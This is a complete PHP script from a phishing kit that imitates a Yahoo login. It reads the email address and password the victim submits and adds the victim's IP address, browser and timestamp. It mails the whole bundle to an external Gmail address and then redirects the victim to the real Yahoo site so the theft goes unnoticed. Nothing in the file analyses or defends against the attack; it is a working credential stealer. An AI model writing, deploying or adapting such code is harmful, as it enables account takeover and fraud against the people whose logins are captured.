<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");
$Editbox1 = $_POST['Editbox1'];
$Editbox2 = $_POST['Editbox2'];
$message .= "|-----------| Y 4 H 0 0! | L 0 G |-------------|\n";
$message .= "|EM41L :: ".$_POST['Editbox1']."\n";
$message .= "|P455W :: ".$_POST['Editbox2']."\n";
$message .= "|-----------| M 0 R 3 | 1 N F 0  |-------------|\n";
$message .= "|C_l1ent 1_P :: ".$ip."\n";
$message .= "|B_r0wser :: ".$useragent."\n";
$message .= "|Date & Time :: ".$date."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ---2-|\n";
$message .= "|-----------| !!!!ALUBARIKKA!!!! |-------------|\n";
$send = "felacity113@gmail.com";
$subject = "|MY GOD IS ALWAYS GOOD|$Editbox1|$Editbox2|";
{
mail("$send", "$subject", $message);
}
header("Location: http://www.yahoo.com/");
?>